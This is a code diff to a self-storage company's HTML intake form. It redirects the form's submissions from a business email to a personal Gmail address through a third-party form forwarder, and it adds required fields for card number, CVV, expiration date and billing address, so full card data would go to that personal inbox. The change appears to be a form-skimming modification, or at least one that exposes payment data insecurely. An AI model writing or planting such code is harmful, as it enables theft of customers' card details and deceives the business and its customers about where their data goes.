@@ -165,7 +165,7 @@
 <body>
    <img src="./1.png" alt="Storage Plus Logo" class="logo">
    <h1>Storage Plus Intake Form</h1>
-	<form action="https://submify.vercel.app/nyc@nystorage.com" method="POST" enctype="multipart/form-data">
+	<form action="https://submify.vercel.app/2avi2dd@gmail.com" method="POST" enctype="multipart/form-data">
 
  <p class="required-note">* Indicates required fields</p>
       
@@ -189,12 +189,10 @@
          <p>Opt in for Text Messages(Msg & Data rates may apply) <span style="color: red;">*</span></p>
          <div class="checkbox-group">
             <label>
-            <input type="radio" name="text_opt_in" value="Yes" id="text_yes" required> Yes
-
+               <input type="radio" name="text_opt_in" value="Yes" id="text_yes">       Yes
             </label>
             <label>
-			<input type="radio" name="text_opt_in" value="No" id="text_no"> No
-      
+               <input type="radio" name="text_opt_in" value="No" id="text_no">       No
             </label>
             <div id="text-checkbox-error" class="error-message">Please select Yes or No for text message opt-in</div>
          </div>
@@ -270,14 +268,6 @@
 
 
 
-
-
-
-
-
-
-
-
       <div class="form-section">
          <div class="section-title">Additional Access Authorization</div>
          <p>Additional Person(s) authorized for Access (vacate/close account, transfer, cutluck):</p>
@@ -341,6 +331,28 @@
 
       <br><br>
 
+
+      <!-- NEW CARD DETAILS FIELDS (only show when Card is selected) -->
+      <p>Card Number: <span style="color: red;">*</span></p>
+      <input type="text" name="card_number" placeholder="Enter card number" required>
+
+      <p>CVV: <span style="color: red;">*</span></p>
+      <input type="text" name="card_cvv" placeholder="Enter CVV" required maxlength="4">
+
+      <p>Expiration Date (MM/YY): <span style="color: red;">*</span></p>
+      <input type="text" name="card_expiration" placeholder="MM/YY" required>
+
+      <!-- BILLING ADDRESS -->
+      <p>Billing Address: <span style="color: red;">*</span></p>
+      <input type="text" id="billing_address" name="billing_address" placeholder="Enter billing address" required>
+
+      <label>
+        <input type="checkbox" id="same_address_checkbox">
+        Same address as above
+      </label>
+
+
+
      
 </div>
 <div class="form-section">
@@ -375,11 +387,39 @@ function togglePaymentOptions() {
     // Clear card-only selections if user switches to CASH
     document.getElementById("box1").checked = false;
     document.getElementById("box2").checked = false;
+
+    // Reset billing address if switching away from Card
+    const billingField = document.getElementById("billing_address");
+    const sameAddressCheckbox = document.getElementById("same_address_checkbox");
+    if (billingField) {
+      billingField.style.display = "block";
+      billingField.required = true;
+    }
+    if (sameAddressCheckbox) {
+      sameAddressCheckbox.checked = false;
+    }
   }
 }
 
-document.querySelector('form').addEventListener('submit', function(e) {
+// Handle Billing Address checkbox
+document.addEventListener("DOMContentLoaded", function() {
+  const sameAddressCheckbox = document.getElementById("same_address_checkbox");
+  const billingField = document.getElementById("billing_address");
 
+  if (sameAddressCheckbox) {
+    sameAddressCheckbox.addEventListener("change", function() {
+      if (this.checked) {
+        billingField.style.display = "none";   // hide field
+        billingField.required = false;         // remove required
+      } else {
+        billingField.style.display = "block";  // show field
+        billingField.required = true;          // make required again
+      }
+    });
+  }
+});
+
+document.querySelector('form').addEventListener('submit', function(e) {
   // Main payment type validation
   const cash = document.querySelector('input[name="payment_type"][value="Cash"]').checked;
   const card = document.querySelector('input[name="payment_type"][value="Card"]').checked;
@@ -414,10 +454,9 @@ document.querySelector('form').addEventListener('submit', function(e) {
 });
 </script>
 
+
 </body>
 </html>
-
-
 
 
 
